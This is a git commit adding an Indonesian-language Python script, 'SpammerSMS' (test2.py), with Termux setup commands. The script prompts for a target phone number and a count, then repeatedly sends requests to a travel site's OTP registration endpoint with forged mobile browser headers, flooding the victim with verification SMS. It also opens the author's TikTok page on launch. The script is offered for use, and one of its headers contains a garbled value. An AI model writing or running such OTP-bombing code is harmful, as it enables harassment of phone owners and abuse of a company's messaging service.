18e04fc646a944643d0ab30dbd08a241cb0d85ab
Hanzz98 <142702453+Hanzz98@users.noreply.github.com>
2023-09-22 19:08:45 +0700

    git clone https://github.com/Hanzz98/SpammerSMS
    apt update && apt upgrade
    pkg install python
    pkg install python-pip
    pkg install nano
    pkg install requests
    git clone https://github.com/Hanzz98/SpammerSMS
    cd SpammerSMS
    python test2.py

---
+++ test2.py
@@ -0,0 +1,41 @@
+#Pembuat Nya Adalah Hanzz98
+import random
+import sys
+import time
+import getpass
+import requests
+import json
+import os
+def mengetik(s):
+    for c in s + '\n':
+        sys.stdout.write(c)
+        sys.stdout.flush()
+        time.sleep(random.random() * 0.1)
+#Jangan Disetting Kode Ini
+mengetik('Loading[■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■■]\n》Done《')
+time.sleep(0.8)
+os.system('clear')
+mengetik('Follow Dulu Bangsat!!!')
+os.system("xdg-open https://tiktok.com/@hanwyxz")
+time.sleep(8.2)
+os.system('clear')
+mengetik('Selamat Datang Di \033[1;34mSpam WhatsApp OTP\n\033[0;37mAjarin Dong Puh Sepuh\nSaya Bukan Sepuh Python Awokawokawok Baru Belajar Gua Lol\n[Author/Pemilik:\033[0;17mHanzz98\033[0;37m]')
+print("\n")
+time.sleep(0.89)
+#Kiriman Spam WA
+time.sleep(2.90)
+mengetik('Contoh: +62xxx')
+mengetik('Contoh: 3')
+nomer = input('Masukkan Nomor Target: ')
+jumlah = input('Isi Untuk Beberapa Spam: ')
+mengetik('☆LogSpam.txt☆')
+print("\n")
+for i in range(int(jumlah)):
+  time.sleep(60)
+  mengetik('Berhasil - \033[0;31mKalau gak kekirim kode otp mungkin lagi belum muncul dari otpnya\033[0;37m')
+  aladin=requests.post("https://m.misteraladin.com/api/members/v2/otp/request",headers={"Host":"m.misteraladin.com","accept-language":"id","sec-ch-ua-mobile":"?1","content-type":"application/json","accept":"application/json, text/plain, */*","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","x-platform":"mobile-web","sec-ch-ua-platform":"Android","origin":"https://m.misteraladin.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.misteraladin.com/account","accept-encoding":"gzi<p, deflate, br"},data=json.dumps({"phone_number_country_code":"62","phone_number":nomer,"type":"register"})).text
+  time.sleep(10)
+#Thanks Yang Sudah Pakai Script Ku
+#Update Nanti V3!!!
+#Muncul 3 Sms / 1 Biji/Kali
+#Tampilan Yang Menarik
